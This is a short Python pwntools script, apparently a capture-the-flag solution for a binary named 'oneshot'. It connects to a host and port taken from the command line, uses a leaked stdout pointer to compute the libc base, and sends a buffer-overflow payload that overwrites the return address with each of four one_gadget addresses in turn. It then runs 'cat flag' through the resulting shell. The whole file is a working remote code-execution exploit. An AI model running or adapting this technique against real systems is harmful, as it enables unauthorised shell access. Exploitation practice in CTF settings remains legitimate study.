#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


e = pwn.ELF("src/oneshot")
libc = pwn.ELF("src/libc.so.6")


oglist = [0x4526a, 0xf02a4, 0x45216, 0xf1147]

for idx, value in enumerate(oglist, 1):
    pwn.log.info("attemp {} with {}".format(idx, hex(value)))

    r = pwn.remote(sys.argv[1], int(sys.argv[2]))

    r.recvuntil(b"stdout: ")
    stdout = int(r.recvn(14), 16)
    lb = stdout - libc.symbols["_IO_2_1_stdout_"]
    og = lb + value

    payload = b"A" * 0x18
    payload += b"\x00" * 0x08
    payload += b"B" * 0x08
    payload += pwn.p64(og)

    r.sendafter(b"MSG: ", payload)
    r.recvline()

    r.sendline(b"cat flag")
    flag = r.recvall(timeout=1)
    if (flag != b""):
        pwn.success("success with gadget {} flag is {}".format(hex(value), flag))
        break